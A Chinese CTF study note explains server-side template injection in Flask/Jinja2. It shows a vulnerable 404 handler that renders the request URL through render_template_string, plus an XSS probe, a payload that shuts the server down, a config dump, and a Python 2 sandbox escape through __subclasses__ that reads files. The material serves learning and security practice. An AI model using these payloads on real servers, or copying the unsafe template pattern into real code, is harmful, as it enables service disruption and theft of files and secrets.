# SQL注入，SSTI注入等备忘

之前做ctf题目的时候第一次遇到SSTI注入这个知识点，一直也没静下心来好好地总结一下。

最典型的一个例子如下：

```python
@app.errorhandler(404)
def page_not_found(e):
    template = '''{%% extends "layout.html" %%}
{%% block body %%}
    <div class="center-content error">
        <h1>Oops! That page doesn't exist.</h1>
        <h3>%s</h3>
    </div>
{%% endblock %%}
''' % (request.url)
    return render_template_string(template), 404
```
直接将用户的输入渲染到模板中
如果我们提交`<script>alert(42)</script>`就会触发xss

当然也可以做一点好玩的，比如{{1+1}}这时候页面就会显示2了

看到很多文章在讲解SSTI的时候，都会结合python沙箱逃逸，其实jinja模板就是一个典型的沙箱，所以python的沙箱逃逸的姿势都可以照搬过来

但是在这之前，我们必须知道jinja模板中的上下文，也就是哪些是我们可以利用的

## jinja模板
三种语句不用说了

获取变量的属性——对应python的`__getitem__`方法
下面两条语句是等效的
```python
{{ foo.bar }}
{{ foo['bar'] }}
```

文档中对这两种方式还做了一些补充
> foo.bar方式：
> * check for an attribute called bar on foo (getattr(foo, 'bar'))
> * if there is not, check for an item 'bar' in foo (foo.__getitem__('bar'))
> * if there is not, return an undefined object.


> foo['bar']方式：
> *check for an item 'bar' in foo. (foo.__getitem__('bar'))
> *if there is not, check for an attribute called bar on foo. (getattr(foo, 'bar'))
> *if there is not, return an undefined object.


### 过滤器
这是jinja模板中最重要的一个特性

比如 `{name|striptags|title}`会将name这个变量中的所有html标签都去除掉并且调用`title()`函数
是不是很像管道？

来看几个过滤器

* escape()将&, <, >, ‘, and ”  这些字符转化为html实体编码
* join(value, d=u'', attribute=None)   [1, 2, 3]|join('|') => 1|2|3
* `safe`(*value*) 这个就有点危险了



## 上下文

### request

通过`request.environ`是一个与服务器环境相关的对象

`{{ request.environ['werkzeug.server.shutdown']() }}` 这个payload会直接让服务器宕机



### config

`{{ config.items() }}`当前配置对象



## python沙箱逃逸

python2环境
```python
In [1]: ''.__class__.__mro__ 
Out[1]: (str, basestring, object)

In [2]: ''.__class__
Out[2]: str   # 获取当前对象所属的类


In [3]: ''.__class__.__mro__[1]
Out[3]: basestring

In [4]: ''.__class__.__mro__[2]
Out[4]: object

In [5]: ''.__class__.__mro__[2].__subclasses__()  #获取道内置的类？
[type,
 weakref,
 weakcallableproxy,
 weakproxy,
 int,
 basestring,
 bytearray,
 list,
 NoneType,
 NotImplementedType,
 ...
 
 ]
 
 # 我们可以通过一次遍历找到我们想要的类
In [8]: ''.__class__.__mro__[2].__subclasses__()[40]
Out[8]: file

# 有了file类就可以读文件了

In [13]: ''.__class__.__mro__[2].__subclasses__()[40]('./test.txt').read()
Out[13]: '1111111111111'

# 像一颗树一样，先到达最顶端object之后再不断往下

# 内建函数与内建变量
In [16]: dir(__builtin__)
Out[16]:
['ArithmeticError',
 'AssertionError',
 'AttributeError',
 'BaseException',
 'BufferError',
 'BytesWarning',
 'DeprecationWarning',
 ...]

 
```

